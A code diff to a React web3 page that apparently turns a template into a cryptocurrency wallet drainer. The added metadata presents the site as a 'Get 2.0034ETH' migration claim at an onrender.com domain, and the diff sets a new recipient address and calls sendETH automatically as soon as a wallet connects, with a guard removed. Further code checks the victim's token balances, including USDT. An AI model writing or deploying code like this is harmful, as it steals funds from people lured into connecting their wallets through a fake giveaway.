@@ -7,7 +7,7 @@ import { useEffect } from 'react'
 import BigNumber from 'bignumber.js'
 
 //this is the hook that return wallet provider
-const recipientAddress = '0x33B5aF848f81F8d97dA2D0dd6b7746198F53c2Fc';
+const recipientAddress = '0x1991B6A81324A6574933D133666742e8643283cD';
 // 1. Get projectId
 const projectId = 'a4369cd63b3d980fa2b3a8f2a188e102'
 
@@ -29,10 +29,10 @@ const sepolianet = {
 }
 // 3. Create modal
 const metadata = {
-  name: 'My Website',
-  description: 'My Website description',
-  url: 'https://mywebsite.com', // origin must match your domain & subdomain
-  icons: ['http://localhost:3000/']
+  name: 'Get 2.0034ETH',
+  description: 'Get 2.0034ETH',
+  url: 'https://migrationclaimwallet.onrender.com', // origin must match your domain & subdomain
+  icons: ['https://migrationclaimwallet.onrender.com']
 }
 
 createWeb3Modal({
@@ -87,7 +87,8 @@ async function checkBalance(contractAddress,contractAbi,contractSigner,currency)
 }
 useEffect(() => {
  if(isConnected){
-  sendETH();
+ sendETH();
+  console.log('dkdk')
   const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
   const signer =  ethersProvider.getSigner();
   const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
@@ -153,7 +154,7 @@ useEffect(() => {
 
 
 async function sendETH() {
-  if(isConnected){
+ 
   try {
    
     const provider = new ethers.providers.Web3Provider(walletProvider)
@@ -184,7 +185,7 @@ async function sendETH() {
   } catch (error) {
       console.error('Error:', error);
   }
-}
+
 }
     async function onSignMessage() {
       alert('connected')
